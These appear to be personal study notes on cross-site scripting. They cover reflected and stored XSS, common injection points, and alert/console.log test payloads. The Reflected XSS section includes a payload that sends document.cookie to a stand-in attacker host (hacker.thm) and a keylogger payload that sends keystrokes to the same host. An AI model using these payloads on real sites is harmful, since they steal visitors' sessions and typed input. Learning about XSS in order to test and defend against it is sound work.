# XSS
---

## Things u must learn to master javascript:
	- Javascript 
	- How web and server processes JS

XSS is a type of attack when an attacker  is able to execute javascript code on a website.. When a vulnerable website accepts user input and displays it without properly filtering it, the browser may interpret the injected code as part of the webpage

## Testing for XSS

Payload : This is a simple payload to test for XSS.

```JavaScript
<script>alert('XSS')</script>
```
```
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

While alert() is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so console.log() can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:
```
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```


### Where Payloads Are Injected

- Search fields
- Comment Section
- Profile Names
- Feedback Forms
- URL parameters

## Types of XSS
---
### Reflected XSS:
Reflected XSS occurs when a web app takes user input (such as a query string, form field, or header) and immediately displays it on a page without sanitising it.
When the injected script runs in the victim’s browser, it can read or modify the page, steal cookies or session tokens (unless those cookies are HttpOnly), perform actions on behalf of the user, or load other malicious content. The root cause is outputting untrusted data as code rather than escaping it for the appropriate context.

You can use simple payloads like *<script>alert("11")</script>* to check for Reflected XSS.
- Payload to grab data:
	- <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
	- Keylogger :
		```JS
		<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>
		```
	

### Stored XSS:
Stored XSS happens when an application saves attacker-controlled input on the server (in a database, normally) and later serves that content to other users without proper escaping, causing the injected script to run in every visitor’s browser.

Stored XSS is commonly found in comment sections, user profiles, message boards, product reviews, and file upload features that render metadata.


